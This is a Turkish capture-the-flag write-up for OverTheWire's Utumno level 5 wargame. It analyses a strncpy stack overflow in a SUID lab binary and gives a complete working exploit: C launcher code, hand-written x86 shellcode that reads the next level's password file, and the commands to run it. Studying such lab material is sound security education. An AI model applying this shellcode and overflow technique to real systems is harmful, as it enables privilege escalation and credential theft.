# OverTheWire — Utumno Level 5 Çözümü (utumno5 → utumno6)

> Hedef: `utumno5` kullanıcısından `utumno6` kullanıcısının şifresini elde etmek.
> Teknik: `hihi()` içinde **`strncpy` ile null-eklemeyen** stack overflow → tam 4-byte ret ezme;
> argc-hilesi (utumno2) + executable stack'te env-var shellcode + gömülü `cat` komutu.

---

## 1. Bağlantı

```bash
ssh utumno5@utumno.labs.overthewire.org -p 2227
# şifre: **********   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno5
# -r-sr-x--- 1 utumno6 utumno5 13096 utumno5   <-- SUID utumno6, grup utumno5 = OKUNABİLİR
strings /utumno/utumno5
#   strcpy, strncpy, strlen, printf, "Aw..", "Here we go - %s", "hihi"
#   ... -fno-stack-protector ...                <-- canary YOK
readelf -l /utumno/utumno5 | grep GNU_STACK
#   GNU_STACK ... RWE                            <-- stack EXECUTABLE
/utumno/utumno5 < /dev/null   # "Aw.."  (argc kontrolü)
```

---

## 3. Statik Analiz

### `main`
```c
int main(int argc, char **argv) {
    if (argc == 0) goto proceed;
    if (argc != 1) { puts("Aw.."); exit(1); }
    if (argv[0][0] == '\0') goto proceed;     // argc==1 && boş argv[0]
    puts("Aw.."); exit(1);
proceed:
    printf("Here we go - %s\n", argv[10]);    // argv[10] = *(argv+0x28)
    hihi(argv[10]);
    return 0;
}
```
utumno2 ile **aynı argc kısıtı** (`argc==0` veya `argc==1`+boş argv[0]) ve **aynı `argv[10]`** kaynağı.

### `hihi` (asıl zafiyet)
```bash
objdump -d -M intel /utumno/utumno5 | sed -n '/<hihi>:/,/^$/p'
```
```c
void hihi(char *s) {
    char buf[12];                 // ebp-0xc
    if (strlen(s) <= 19)
        strcpy(buf, s);           // <=19: kopyalar + NULL ekler (ret'in son byte'ı 0 olur)
    else
        strncpy(buf, s, 20);      // >19: TAM 20 byte, NULL EKLEMEZ  <<< buradan
}
```

- `buf = ebp-0xc` (12 byte), return adresi `ebp+4` → mesafe `0xc + 4 = 16`.
- **`strncpy` dalı (len > 19):** 20 byte kopyalanır, null eklenmez → `s[16..19]` = return adresinin
  **4 baytı da tam** (null sorunu yok). 12 (buf) + 4 (saved ebp) + 4 (ret) = 20.
- **`strcpy` dalı (len ≤ 19):** kopya null ile biter → ret'in 4. baytı 0 olurdu (kullanışsız).

⇒ `strlen(s) > 19` olacak şekilde **20 baytlık** payload ver: `16 dolgu + 4 ret`.

---

## 4. Strateji (utumno2 ile aynı iskelet)

- `execve(argv={NULL})` → kernel `argc=1`, `argv[0]=""` → `proceed`. `argv[10] = envp[8]`
  (kernel zorlaması). Sağlamlık için payload'ı hem `envp[8]` hem `envp[9]`'a koy.
- Payload = `"BBBBBBBBBBBBBBBB"` (16) + `RET` (4) = 20 byte → `strlen=20>19` → strncpy dalı.
- `RET` = `EGG` env değişkenindeki NOP sled'i gösterir (stack RWE, ASLR yok).
- Shellcode self-contained: `/bin/sh -c "cat /etc/utumno_pass/utumno6"` (utumno4'ten tek fark
  komut string'inde `utumno5`→`utumno6`, bayt `0x35`→`0x36`).
- Adres yine printer ile bulunur (`environ[0] + 4 + 30000`, sled ortası).

---

## 5. Final Exploit

### `ex5.c`
```c
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
unsigned char sc[]={ /* null-free: setreuid; execve /bin/sh -c "cat .../utumno6" */
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80,
 0x31,0xc0,0x50,
 0x68,0x6d,0x6e,0x6f,0x36, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,0x31,0xc0,0xb0,0x0b,0xcd,0x80};
#define SLED 60000
static char eggenv[4+SLED+256];
static char payload[24];
static char *envp[12];
void build(unsigned int ret){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 memset(payload,'B',16); *(unsigned int*)(payload+16)=ret; payload[20]=0;  /* len 20 > 19 */
 envp[0]=eggenv;
 for(int i=1;i<=7;i++) envp[i]="AA=AA";
 envp[8]=payload; envp[9]=payload; envp[10]=0;
}
int main(int argc,char**argv){
 char *av[]={0};
 if(argc>=2 && !strcmp(argv[1],"find")){ build(0x42424242); execve("/tmp/p2A7xK9mLq",av,envp); }
 else if(argc>=3 && !strcmp(argv[1],"run")){ build(strtoul(argv[2],0,16)); execve("/utumno/utumno5",av,envp); }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Çalıştırma
```bash
gcc -m32 -o ex5 ex5.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (kendi kullanıcına ait taze bir path kullan)

ENV0=$(./ex5 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")
./ex5 run "$RET"          # strncpy ret ezme -> sled -> shellcode -> cat
```

Çıktı:
```
ENV0=fffef4cb RET=ffff69ff
**********
```

---


## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **`strcpy` vs `strncpy`** | `strcpy` null ekler (ret son byte = 0); `strncpy(.,.,20)` null EKLEMEZ → tam ret |
| **Uzunluk dalını seç** | `strlen(s) > 19` ile bilerek `strncpy` dalına gir → 4-byte ret ezilir |
| **Offset 16** | `buf=ebp-0xc` → 12 + 4 (saved ebp) = 16 |
| **argc-hilesi tekrar** | utumno2 ile aynı: `argv[10]=envp[8/9]`, `execve argv={NULL}` |
| **Tekrar kullanılan iskelet** | Aynı launcher + self-contained shellcode (komutta seviye no değişir) |
| **/tmp çakışması** | Önceki seviyenin sahibi olduğu `/tmp` printer'ı üzerine yazılamaz → taze path kullan |

